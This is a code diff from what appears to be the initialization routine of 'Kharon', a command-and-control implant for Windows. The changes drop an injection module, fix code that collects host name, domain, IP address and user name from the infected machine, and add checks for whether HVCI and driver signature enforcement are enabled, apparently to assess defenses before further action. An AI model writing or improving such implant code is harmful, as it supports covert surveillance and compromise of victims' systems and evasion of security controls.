@@ -71,9 +71,7 @@ EXTERN_C DECLFN auto Main(
     Package*   KhPackage = (Package*)  AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Package));   new (KhPackage) Package(Kh);
     Parser*    KhParser  = (Parser*)   AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Parser));    new (KhParser) Parser(Kh);
     Mask*      KhMask    = (Mask*)     AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Mask));      new (KhMask) Mask(Kh);
-    Injection* khInject  = (Injection*)AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Injection)); new (khInject) Injection(Kh);
 
-    Kh->InitInject( khInject );
     Kh->InitCrypt( KhCrypt );
     Kh->InitSpoof( KhSpoof );
     Kh->InitCoff( KhCoff );
@@ -233,9 +231,6 @@ auto DECLFN Kharon::Init(
 
     MemInfoEx.dwLength = sizeof( MEMORYSTATUSEX );
 
-    this->Machine.AllocGran = SysInfo.dwAllocationGranularity;
-    this->Machine.PageSize  = SysInfo.dwPageSize;
-
     this->Machine.OsMjrV  = NtCurrentPeb()->OSMajorVersion;
     this->Machine.OsMnrV  = NtCurrentPeb()->OSMinorVersion;
     this->Machine.OsBuild = NtCurrentPeb()->OSBuildNumber;
@@ -250,6 +245,9 @@ auto DECLFN Kharon::Init(
 
     this->Mm->PageSize = SysInfo.dwPageSize;
     this->Mm->PageGran = SysInfo.dwAllocationGranularity;
+
+    this->Machine.AllocGran = SysInfo.dwAllocationGranularity;
+    this->Machine.PageSize  = SysInfo.dwPageSize;
 
     this->Krnl32.IsWow64Process( NtCurrentProcess(), &IsWow64 );
 
@@ -290,19 +288,19 @@ auto DECLFN Kharon::Init(
 
     this->Session.Elevated = Elevation.TokenIsElevated;
 
-    Success = this->Krnl32.GetComputerNameExA( ComputerNameDnsHostname, NULL, &TmpVal );
+    Success = this->Krnl32.GetComputerNameExA( ComputerNameDnsHostname, nullptr, &TmpVal );
     if ( ! Success ) {
         this->Machine.CompName = (PCHAR)this->Hp->Alloc( TmpVal );
         this->Krnl32.GetComputerNameExA( ComputerNameDnsHostname, this->Machine.CompName, &TmpVal );
     }
 
-    Success = this->Krnl32.GetComputerNameExA( ComputerNameDnsDomain, NULL, &TmpVal );
+    Success = this->Krnl32.GetComputerNameExA( ComputerNameDnsDomain, nullptr, &TmpVal );
     if ( ! Success ) {
         this->Machine.DomName = (PCHAR)this->Hp->Alloc( TmpVal );
         this->Krnl32.GetComputerNameExA( ComputerNameDnsDomain, this->Machine.DomName, &TmpVal );
     }
 
-    Success = this->Krnl32.GetComputerNameExA( ComputerNameNetBIOS, NULL, &TmpVal );
+    Success = this->Krnl32.GetComputerNameExA( ComputerNameNetBIOS, nullptr, &TmpVal );
     if ( ! Success ) {
         this->Machine.NetBios = (PCHAR)this->Hp->Alloc( TmpVal );
         this->Krnl32.GetComputerNameExA( ComputerNameNetBIOS, A_PTR( this->Machine.NetBios ), &TmpVal );
@@ -316,27 +314,32 @@ auto DECLFN Kharon::Init(
     this->Iphlpapi.GetAdaptersInfo( nullptr, &AdapterLen );
     Adapter = (IP_ADAPTER_INFO*)this->Hp->Alloc( AdapterLen );
     if ( Adapter ) {
-        IP_ADAPTER_INFO* CurrentAdapter = Adapter;
+        if ( this->Iphlpapi.GetAdaptersInfo( Adapter, &AdapterLen ) == NO_ERROR ) {
+            IP_ADAPTER_INFO* CurrentAdapter = Adapter;
 
-        while ( Adapter ) {
-            if ( this->Iphlpapi.GetAdaptersInfo( CurrentAdapter, &AdapterLen ) ) {
-                if ( this->Ntdll.RtlIpv4StringToAddressA( CurrentAdapter->IpAddressList.IpAddress.String, FALSE, (PCHAR*)&Terminator, &IpObject ) ) {
-                    this->Machine.IpAddress = IpObject.S_un.S_addr;
-                    break;
+            while ( CurrentAdapter ) {
+                if ( CurrentAdapter->IpAddressList.IpAddress.String[0] != '\0' ) {
+                    if ( this->Ntdll.RtlIpv4StringToAddressA( CurrentAdapter->IpAddressList.IpAddress.String, FALSE, (PCHAR*)&Terminator, &IpObject ) == STATUS_SUCCESS ) {
+                        this->Machine.IpAddress = IpObject.S_un.S_addr;
+                        break;
+                    }
                 }
 
                 CurrentAdapter = CurrentAdapter->Next;
             }
-
-            break;
         }
 
         this->Hp->Free( Adapter );
     }
 
-    TmpVal = MAX_PATH;
-    this->Machine.UserName = (PCHAR)this->Hp->Alloc( TmpVal );
-    this->Advapi32.GetUserNameA( this->Machine.UserName, &TmpVal );
+    TmpVal = 0;
+    if ( !this->Advapi32.GetUserNameA( nullptr, &TmpVal ) && KhGetError == ERROR_INSUFFICIENT_BUFFER ) {
+        this->Machine.UserName = (PCHAR)this->Hp->Alloc( TmpVal );
+        if ( !this->Advapi32.GetUserNameA( this->Machine.UserName, &TmpVal ) ) {
+            this->Hp->Free( this->Machine.UserName );
+            this->Machine.UserName = nullptr;
+        }
+    }
     
     this->Advapi32.RegOpenKeyExA( 
         HKEY_LOCAL_MACHINE, cProcessorNameReg,
@@ -386,7 +389,26 @@ auto DECLFN Kharon::Init(
     KhDbgz( "Total RAM: %d", this->Machine.TotalRAM );
     KhDbgz( "Aval RAM: %d", this->Machine.AvalRAM );
     KhDbgz( "Used RAM: %d", this->Machine.UsedRAM );
-    KhDbgz( "Win Version: %d.%d.%d\n", this->Machine.OsMjrV, this->Machine.OsMnrV, this->Machine.OsBuild);
+    KhDbgz( "Win Version: %d.%d.%d", this->Machine.OsMjrV, this->Machine.OsMnrV, this->Machine.OsBuild);
+    
+    SYSTEM_SECUREBOOT_POLICY_INFORMATION SecureBootInfo = { 0 };
+    ULONG SecureBootLen = 0;
+
+    if ( NT_SUCCESS( this->Ntdll.NtQuerySystemInformation( 
+        SystemSecureBootPolicyInformation, 
+        &SecureBootInfo, 
+        sizeof(SecureBootInfo), 
+        &SecureBootLen ) ) ) {
+        
+        // HVCI (Hypervisor-protected Code Integrity / VBS)
+        this->Machine.HhvciEnabled = (SecureBootInfo.PolicyOptions & 0x01) != 0;
+        
+        // DSE (Driver Signature Enforcement)
+        this->Machine.DseEnabled = (SecureBootInfo.PolicyOptions & 0x02) != 0;
+    }
+        
+    KhDbgz( "HVCI Enabled: %s", this->Machine.HhvciEnabled ? "Yes" : "No" );
+    KhDbgz( "DSE Enabled: %s\n", this->Machine.DseEnabled ? "Yes" : "No" );
 
     KhDbgz( "======== Transport Informations ========" );
     KhDbgz("profile c2: %X", PROFILE_C2);
